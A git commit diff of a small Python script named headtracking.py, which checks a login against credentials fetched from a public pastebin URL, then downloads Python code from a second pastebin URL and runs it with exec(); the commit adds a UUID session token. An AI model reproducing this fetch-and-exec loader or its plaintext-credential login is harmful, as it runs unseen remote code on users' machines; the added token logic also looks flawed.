50e4680d7b6744d1fbd28a5c84bdc1993d770863
Saintwq <130616689+saintzada@users.noreply.github.com>
2023-09-19 03:55:58 +0000

    headtracking.py

--- headtracking.py
+++ headtracking.py
@@ -1,16 +1,20 @@
 import json
 import time
 import requests
+import uuid
 
-# code by saintwq - shadow tweaker
-# shadow tweaker - 2023
+# Estrutura para rastrear os tokens de autenticação
+active_tokens = set()
+
+def generate_token():
+    return str(uuid.uuid4())  # Gere um token único usando UUID
 
 def authenticate_user(username, password, auth_data):
     if username in auth_data and auth_data[username] == password:
         return True
     return False
 
-pastebin_login_url = "https://pastebin.com/raw/fArbGgkR"
+pastebin_login_url = "https://pastebin.com/raw/fArbGgkR"  # Substitua pelo seu URL
 pastebin_code_url = "https://pastebin.com/raw/gF7tyWCf"
 
 response = requests.get(pastebin_login_url)
@@ -23,9 +27,18 @@ if response.status_code == 200:
         password = input("Pass: ")
 
         if authenticate_user(username, password, auth_data):
-            print("Wait a few seconds, you are logged.")
+            # Verifique se o usuário já está autenticado
+            if username in active_tokens:
+                print("User is already logged in on another device.")
+                continue
             
-         
+            # Gere um token de autenticação exclusivo
+            token = generate_token()
+            active_tokens.add(username)
+            
+            print(f"Wait a few seconds, you are logged. Your token: {token}")
+            
+            # Solicite o código Python após a autenticação bem-sucedida
             response_code = requests.get(pastebin_code_url)
             
             if response_code.status_code == 200:
@@ -40,5 +53,6 @@ try:
     exec(python_code)
 except Exception as e:
     print(f"Error: {e}")
-# code by saintwq - shadow tweaker
-# shadow tweaker - 2023
+
+# Remova o token do usuário quando a sessão terminar
+active_tokens.remove(username)
